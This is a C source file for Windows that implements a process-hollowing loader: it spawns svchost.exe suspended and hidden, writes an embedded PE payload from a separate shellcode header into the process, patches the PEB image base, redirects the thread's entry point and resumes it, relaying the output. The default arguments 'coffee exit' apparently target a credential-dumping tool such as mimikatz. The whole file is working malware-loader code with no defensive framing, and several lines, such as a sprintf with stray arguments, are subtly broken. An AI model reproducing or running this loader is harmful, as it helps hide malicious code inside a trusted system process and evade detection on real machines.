#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "shellcode.h"

#define MAX_NUM(a, b) a > b ? a : b;
#define MIN_NUM(a, b) a < b ? a : b;
#define MAX_INDIVIDUAL_CMDLINE_ARG_LEN 100

DWORD StrLen(PCHAR str) {
    DWORD len = 0;
    while (TRUE) {
        if (str[len] == 0) {
            return len;
        }
        else {
            len++;
        }
    }
}

void ZeroMemoryCustom(BYTE* pAddress, DWORD dwSize) {
    memset(pAddress, 0, dwSize);
}

void StrCat(PCHAR destination, PCHAR source, DWORD sourceLenMax) {
    DWORD sourceLenToCopy = MIN_NUM(StrLen(source), sourceLenMax);
    DWORD destinationLen = StrLen(destination);
    for (int i = 0; i < sourceLenToCopy; i++) {
        destination[destinationLen + i] = source[i];
    }
}

DWORD64 LoadShellcodeIntoMemory(OUT VOID** ppShellcodeStorage) {
    *ppShellcodeStorage = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (*ppShellcodeStorage == NULL) {
        printf("VirtualAlloc failed: %lu", GetLastError());
        return 0;
    }
    memcpy(*ppShellcodeStorage, shellcode, sizeof(shellcode));
    return sizeof(shellcode);
}

BOOL AdjustMemoryProtections(IN HANDLE hTargetProc, IN ULONG_PTR uBaseAddr, IN PIMAGE_NT_HEADERS pNtHeaders, IN PIMAGE_SECTION_HEADER pSectionHeaders) {

    for (DWORD nSectionIndex = 0; nSectionIndex < pNtHeaders->FileHeader.NumberOfSections; nSectionIndex++) {
        DWORD dwNewProtect = 0, dwOldProtect = 0;

        if (!pSectionHeaders[nSectionIndex].SizeOfRawData || !pSectionHeaders[nSectionIndex].VirtualAddress)
            continue;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwNewProtect = PAGE_WRITECOPY;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ)
            dwNewProtect = PAGE_READONLY;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_READWRITE;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwNewProtect = PAGE_EXECUTE;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwNewProtect = PAGE_EXECUTE_WRITECOPY;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READ;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READWRITE;

        if (!VirtualProtectEx(hTargetProc, (PVOID)(uBaseAddr + pSectionHeaders[nSectionIndex].VirtualAddress),
            pSectionHeaders[nSectionIndex].SizeOfRawData, dwNewProtect, &dwOldProtect)) {
            printf("VirtualProtectEx, error: %lu", GetLastError());
            return FALSE;
        }
    }
    return TRUE;
}

VOID DisplayProcessOutput(IN HANDLE hOutputPipe) {
    DWORD dwBytesAvailable = 0;
    BYTE* pOutputData = NULL;

    // Check if there's data to read without removing it
    if (PeekNamedPipe(hOutputPipe, NULL, 0, NULL, &dwBytesAvailable, NULL) && dwBytesAvailable > 0) {
        pOutputData = (BYTE*)LocalAlloc(LPTR, dwBytesAvailable + 1); // +1 for null terminator
        if (!pOutputData) return;

        DWORD dwBytesRead = 0;
        if (ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, &dwBytesRead, NULL)) {
            if (dwBytesRead > 0) {
                pOutputData[dwBytesRead] = '\0'; // Ensure null-terminated
                printf("%.*s", dwBytesRead, pOutputData);
            }
        }
        LocalFree(pOutputData);
    }
}

BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
    OUT PPROCESS_INFORMATION pProcInfo, OUT HANDLE* phInputPipe, OUT HANDLE* phOutputPipe) {

    STARTUPINFO stStartupInfo = { 0 };
    SECURITY_ATTRIBUTES saSecurity = { 0 };
    HANDLE hInputRead = NULL, hInputWrite = NULL, hOutputRead = NULL, hOutputWrite = NULL;
    LPSTR szCommandLine = NULL;
    BOOL bResult = FALSE;

    ZeroMemoryCustom((BYTE*)pProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemoryCustom((BYTE*)&stStartupInfo, sizeof(STARTUPINFO));
    ZeroMemoryCustom((BYTE*)&saSecurity, sizeof(SECURITY_ATTRIBUTES));

    saSecurity.nLength = sizeof(SECURITY_ATTRIBUTES);
    saSecurity.bInheritHandle = TRUE;

    if (!CreatePipe(&hInputRead, &hInputWrite, &saSecurity, 0)) {
        printf("CreatePipe[1], error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (!CreatePipe(&hOutputRead, &hOutputWrite, &saSecurity, 0)) {
        printf("CreatePipe[2], error: %lu", GetLastError());
        goto CLEANUP;
    }

    stStartupInfo.cb = sizeof(STARTUPINFO);
    stStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    stStartupInfo.wShowWindow = SW_HIDE;
    stStartupInfo.hStdInput = hInputRead;
    stStartupInfo.hStdOutput = stStartupInfo.hStdError = hOutputWrite;

    szCommandLine = (LPSTR)LocalAlloc(LPTR, strlen(szProcessPath) + (szArguments ? strlen(szArguments) : 0) + 2);
    if (!szCommandLine) {
        printf("LocalAlloc, error: %lu", GetLastError());
        goto CLEANUP;
    }

    sprintf(szCommandLine, szArguments ? "%s %s" : "%s", szProcessPath, szArguments ? szArguments : ", error: %lu", GetLastError());

    if (!CreateProcessA(NULL, szCommandLine, NULL, NULL, TRUE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &stStartupInfo, pProcInfo)) {
        printf("CreateProcessA, error: %lu", GetLastError());
        goto CLEANUP;
    }

    *phInputPipe = hInputWrite;
    *phOutputPipe = hOutputRead;
    bResult = TRUE;

CLEANUP:
    if (szCommandLine) LocalFree(szCommandLine);
    if (hInputRead) CloseHandle(hInputRead);
    if (hOutputWrite) CloseHandle(hOutputWrite);
    return bResult;
}

BOOL UpdateRemoteImageBase(IN HANDLE hProcess, IN ULONG_PTR uNewBaseAddr, IN ULONG_PTR uPebOffset) {
    ULONG_PTR uPebImageBaseField = uPebOffset + offsetof(PEB, Reserved3[1]);
    SIZE_T dwBytesWritten = 0;

    if (!WriteProcessMemory(hProcess, (PVOID)uPebImageBaseField, &uNewBaseAddr,
        sizeof(ULONG_PTR), &dwBytesWritten) || dwBytesWritten != sizeof(ULONG_PTR)) {
        printf("WriteProcessMemory, error: %lu", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LPCSTR szCmdArgs) {

    if (!pPayloadData || !szTargetPath) return FALSE;

    PROCESS_INFORMATION stProcInfo = { 0 };
    CONTEXT ctxThread = { .ContextFlags = CONTEXT_ALL };
    HANDLE hInputPipe = NULL, hOutputPipe = NULL;
    BYTE* pRemoteMem = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSections = NULL;
    SIZE_T dwBytesWritten = 0;
    BOOL bSuccess = FALSE;

    if (!SpawnSuspendedProcess(szTargetPath, szCmdArgs, &stProcInfo, &hInputPipe, &hOutputPipe))
        goto CLEANUP;

    pNtHeaders = (PIMAGE_NT_HEADERS)(pPayloadData + ((PIMAGE_DOS_HEADER)pPayloadData)->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT headers\n, error: %lu", GetLastError());
        goto CLEANUP;
    }

    pRemoteMem = (BYTE*)VirtualAllocEx(stProcInfo.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("VirtualAllocEx, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (pRemoteMem != (BYTE*)pNtHeaders->OptionalHeader.ImageBase) {
        printf("[!] Relocation required (unsupported)\n, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (!WriteProcessMemory(stProcInfo.hProcess, pRemoteMem, pPayloadData,
        pNtHeaders->OptionalHeader.SizeOfHeaders, &dwBytesWritten) ||
        dwBytesWritten != pNtHeaders->OptionalHeader.SizeOfHeaders) {
        printf("WriteProcessMemory, error: %lu", GetLastError());
        goto CLEANUP;
    }

    pSections = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(stProcInfo.hProcess, pRemoteMem + pSections[i].VirtualAddress,
            pPayloadData + pSections[i].PointerToRawData, pSections[i].SizeOfRawData, &dwBytesWritten) ||
            dwBytesWritten != pSections[i].SizeOfRawData) {
            printf("WriteProcessMemory, error: %lu", GetLastError());
            goto CLEANUP;
        }
    }

    if (!GetThreadContext(stProcInfo.hThread, &ctxThread)) {
        printf("GetThreadContext, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (!UpdateRemoteImageBase(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, ctxThread.Rdx))
        goto CLEANUP;

    if (!AdjustMemoryProtections(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, pNtHeaders, pSections))
        goto CLEANUP;

    ctxThread.Rcx = (DWORD64)(pRemoteMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    if (!SetThreadContext(stProcInfo.hThread, &ctxThread)) {
        printf("SetThreadContext, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (ResumeThread(stProcInfo.hThread) == (DWORD)-1) {
        printf("ResumeThread, error: % lu", GetLastError());
        goto CLEANUP;
    }

    DWORD dwExitCode = STILL_ACTIVE;
    while (TRUE) {
        if (!GetExitCodeProcess(stProcInfo.hProcess, &dwExitCode)) {
            printf("GetExitCodeProcess failed: %lu", GetLastError());
            break;
        }
        if (dwExitCode != STILL_ACTIVE) break;

        DisplayProcessOutput(hOutputPipe);
        Sleep(100);
    }

    DisplayProcessOutput(hOutputPipe);

    bSuccess = TRUE;

CLEANUP:
    if (hInputPipe) CloseHandle(hInputPipe);
    if (hOutputPipe) CloseHandle(hOutputPipe);
    if (stProcInfo.hProcess) CloseHandle(stProcInfo.hProcess);
    if (stProcInfo.hThread) CloseHandle(stProcInfo.hThread);
    return bSuccess;
}

#define TARGET_APP_PATH "C:\\Windows\\System32\\svchost.exe"

int main(int argc, char* argv[]) {
    BYTE* pPayloadData = NULL;
    DWORD dwPayloadSize = LoadShellcodeIntoMemory((VOID**)&pPayloadData);
    CHAR* pPeArgs = NULL;

    if (!dwPayloadSize) return -1;

    if (argc > 1) {
        DWORD sPeArgsLen = 0;
        for (int i = 1; i < argc; i++) {
            PCHAR arg = argv[i];
            DWORD argLen = StrLen(arg);
            BOOL hasSpace = FALSE;

            // Separate each argument by the introduced double quotes
            if (argLen >= 2 && arg[0] == '\"' && arg[argLen - 1] == '\"') {
                sPeArgsLen += argLen;
            }
            else {
                for (DWORD j = 0; j < argLen; j++) {
                    if (arg[j] == ' ') hasSpace = TRUE;
                }
                if (hasSpace) sPeArgsLen += argLen + 2; // Add quotes
                else sPeArgsLen += argLen;
            }
            sPeArgsLen += 1; // Space between arguments
        }
        sPeArgsLen += 6; // " exit " and null terminator

        pPeArgs = VirtualAlloc(NULL, sPeArgsLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!pPeArgs) {
            printf("\n[-] VirtualAlloc Failed with error %d\n", GetLastError());
            return EXIT_FAILURE;
        }
        ZeroMemoryCustom(pPeArgs, sPeArgsLen);

        // Process each argument
        for (int i = 1; i < argc; i++) {
            PCHAR arg = argv[i];
            DWORD argLen = StrLen(arg);
            CHAR processedArg[MAX_INDIVIDUAL_CMDLINE_ARG_LEN + 3] = { 0 }; // +3 for quotes and null

            BOOL hasSpace = FALSE;
            for (DWORD j = 0; j < argLen; j++) {
                if (arg[j] == ' ') hasSpace = TRUE;
            }
            if (hasSpace) {
                processedArg[0] = '"';
                memcpy(processedArg + 1, arg, argLen);
                processedArg[argLen + 1] = '"';
            }
            else {
                memcpy(processedArg, arg, argLen);
            }

            StrCat(pPeArgs, processedArg, MAX_INDIVIDUAL_CMDLINE_ARG_LEN);
            if (i < argc - 1) {
                StrCat(pPeArgs, " ", 1);
            }
        }

        // Append "exit"
        StrCat(pPeArgs, " exit ", 6);
    }
    else {
        pPeArgs = "coffee exit";
    }
    
    return DeployPayload(pPayloadData, TARGET_APP_PATH, pPeArgs) ? EXIT_SUCCESS : EXIT_FAILURE;
}
